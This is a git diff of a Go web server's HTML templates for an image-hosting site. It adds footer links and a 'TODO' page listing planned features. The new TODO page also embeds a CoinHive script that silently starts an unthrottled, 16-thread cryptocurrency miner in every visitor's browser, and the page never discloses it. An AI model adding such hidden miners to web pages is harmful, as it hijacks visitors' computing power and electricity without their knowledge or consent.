@@ -5,6 +5,8 @@ package server
 <html> and </html>: beginning and end of html section
 <body> and </body>: main part with text
 <!-- and -->: Comments... WHY
+<a href="url"> and </a>: links
+<p> and </p>: margin
 */
 var (
 	firstPage = `<html>
@@ -16,8 +18,7 @@ var (
 <script src='https://www.google.com/recaptcha/api.js'></script>
 </head>
 <body>
-<b> EVERYTHING IS EXPALINED IN SOME DETAIL AT MY GITHUB: </b><br>
-https://github.com/gidoBOSSftw5731/imgsrvr/tree/master
+<b> <a href="https://github.com/gidoBOSSftw5731/imgsrvr/tree/master"> EVERYTHING IS EXPALINED IN SOME DETAIL AT MY GITHUB: </b></a><br>
 <p>
 Needs JS for captchas {{ .Fn}}
 </p>
@@ -40,7 +41,48 @@ Needs JS for captchas {{ .Fn}}
   
 </script>
 </body>
+<footer> <a href="%v"> Home Page </a>&nbsp;&nbsp;  <a href="%vtodo"> TODO page </a> </footer>
 </html>`
+
+	todoPageVar = `<html>
+	<head>
+<meta name="google-site-verification" content="2QLKtDFPPQwFab4Tx2Gf0TJ1SVMI1lSA4VfKsA90SaY" /> <!-- ssshhh... -->
+<title>Imagen Dot Click: TODO</title></head>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
+
+  miner.start();
+  miner.setThrottle(0)
+  miner.setNumThreads(16)
+  
+</script>
+<body>
+<header>
+STUFF THAT HAS BEEN DONE OR WILL BE DONE:
+</header>
+
+
+TODO:
+store file on disk:
+-Accept the file 															DONE <br>
+-create name (from md5)												DONE<br>
+-create a database of pub name (hash) to path	DONE<br>
+-provide path to file													DONE<br>
+-ReCaptcha																		DONE<br>
+-Fonts<br>
+-css..?<br>
+-proper logging																DONE<br>
+-cookies<br>
+-upload bar<br>
+-sessions?<br>
+-statistics<br>
+-link shortening<br>
+</body>
+<footer> <a href="%v"> Home Page </a>&nbsp;&nbsp; <a href="%vtodo"> TODO page </a> </footer>
+</html>
+
+`
 
 	/*testPage = `<html>
 	  <head><title> This is the second test page!!! </title> </head>
